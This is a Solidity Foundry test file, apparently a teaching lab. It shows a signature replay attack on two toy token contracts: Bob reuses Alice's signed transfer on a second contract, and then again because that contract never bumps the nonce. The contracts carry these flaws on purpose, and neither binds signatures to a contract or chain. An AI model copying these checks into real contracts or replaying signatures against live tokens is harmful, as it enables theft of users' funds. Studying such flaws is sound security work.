pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract ContractTest is Test {
    ShipmenttokenWhale CargotokenWhaleContract;
    SixEyeShipmenttoken SixEyeInventorytokenContract;
    address alice = vm.addr(1);
    address bob = vm.addr(2);

    constructor() {
        CargotokenWhaleContract = new ShipmenttokenWhale();
        CargotokenWhaleContract.CargotokenWhaleDeploy(address(this));
        CargotokenWhaleContract.relocateCargo(alice, 1000);
        SixEyeInventorytokenContract = new SixEyeShipmenttoken();
        SixEyeInventorytokenContract.CargotokenWhaleDeploy(address(this));
        SixEyeInventorytokenContract.relocateCargo(alice, 1000);
    }

    function testSignatureReplay() public {
        emit log_named_uint(
            "Balance",
            CargotokenWhaleContract.inventoryOf(address(this))
        );

        bytes32 hash = keccak256(
            abi.encodePacked(
                address(alice),
                address(bob),
                uint256(499),
                uint256(1),
                uint256(0)
            )
        );
        emit log_named_bytes32("hash", hash);


        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, hash);
        emit log_named_uint("v", v);
        emit log_named_bytes32("r", r);
        emit log_named_bytes32("s", s);

        address alice_address = ecrecover(hash, v, r, s);
        emit log_named_address("alice_address", alice_address);
        emit log_string(
            "If operator got the Alice's signature, the operator can replay this signature on the others contracts with same method."
        );
        vm.startPrank(bob);

        CargotokenWhaleContract.movegoodsProxy(
            address(alice),
            address(bob),
            499,
            1,
            v,
            r,
            s
        );

        emit log_named_uint(
            "SET token balance of Bob",
            CargotokenWhaleContract.inventoryOf(address(bob))
        );


        emit log_string(
            "Try to replay to another contract with same signature"
        );
        emit log_named_uint(
            "Before the replay, SIX token balance of bob:",
            SixEyeInventorytokenContract.inventoryOf(address(bob))
        );

        SixEyeInventorytokenContract.movegoodsProxy(
            address(alice),
            address(bob),
            499,
            1,
            v,
            r,
            s
        );
        emit log_named_uint(
            "After the replay, SIX token balance of bob:",
            SixEyeInventorytokenContract.inventoryOf(address(bob))
        );

        SixEyeInventorytokenContract.movegoodsProxy(
            address(alice),
            address(bob),
            499,
            1,
            v,
            r,
            s
        );
        emit log_named_uint(
            "After the second replay, SIX token balance of bob:",
            SixEyeInventorytokenContract.inventoryOf(address(bob))
        );
    }
}

contract ShipmenttokenWhale is Test {
    address player;

    uint256 public totalGoods;
    mapping(address => uint256) public inventoryOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;
    mapping(address => uint256) nonces;

    function CargotokenWhaleDeploy(address _player) public {
        player = _player;
        totalGoods = 2000;
        inventoryOf[player] = 2000;
    }

    function _movegoods(address to, uint256 value) internal {
        inventoryOf[msg.sender] -= value;
        inventoryOf[to] += value;
    }

    function relocateCargo(address to, uint256 value) public {
        require(inventoryOf[msg.sender] >= value);
        require(inventoryOf[to] + value >= inventoryOf[to]);

        _movegoods(to, value);
    }

    function movegoodsProxy(
        address _from,
        address _to,
        uint256 _value,
        uint256 _feeUgt,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) public returns (bool) {
        uint256 nonce = nonces[_from];
        emit log_named_uint("nonce", nonce);
        bytes32 h = keccak256(
            abi.encodePacked(_from, _to, _value, _feeUgt, nonce)
        );
        if (_from != ecrecover(h, _v, _r, _s)) revert();

        if (
            inventoryOf[_to] + _value < inventoryOf[_to] ||
            inventoryOf[msg.sender] + _feeUgt < inventoryOf[msg.sender]
        ) revert();
        inventoryOf[_to] += _value;

        inventoryOf[msg.sender] += _feeUgt;

        inventoryOf[_from] -= _value + _feeUgt;
        nonces[_from] = nonce + 1;
        return true;
    }
}

contract SixEyeShipmenttoken is Test {
    address player;

    uint256 public totalGoods;
    mapping(address => uint256) public inventoryOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Six Eye Token";
    string public symbol = "SIX";
    uint8 public decimals = 18;
    mapping(address => uint256) nonces;

    function CargotokenWhaleDeploy(address _player) public {
        player = _player;
        totalGoods = 2000;
        inventoryOf[player] = 2000;
    }

    function _movegoods(address to, uint256 value) internal {
        inventoryOf[msg.sender] -= value;
        inventoryOf[to] += value;
    }

    function relocateCargo(address to, uint256 value) public {
        require(inventoryOf[msg.sender] >= value);
        require(inventoryOf[to] + value >= inventoryOf[to]);

        _movegoods(to, value);
    }

    function movegoodsProxy(
        address _from,
        address _to,
        uint256 _value,
        uint256 _feeUgt,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) public returns (bool) {
        uint256 nonce = nonces[_from];
        bytes32 h = keccak256(
            abi.encodePacked(_from, _to, _value, _feeUgt, nonce)
        );
        if (_from != ecrecover(h, _v, _r, _s)) revert();

        if (
            inventoryOf[_to] + _value < inventoryOf[_to] ||
            inventoryOf[msg.sender] + _feeUgt < inventoryOf[msg.sender]
        ) revert();
        inventoryOf[_to] += _value;

        inventoryOf[msg.sender] += _feeUgt;

        inventoryOf[_from] -= _value + _feeUgt;
        return true;
    }
}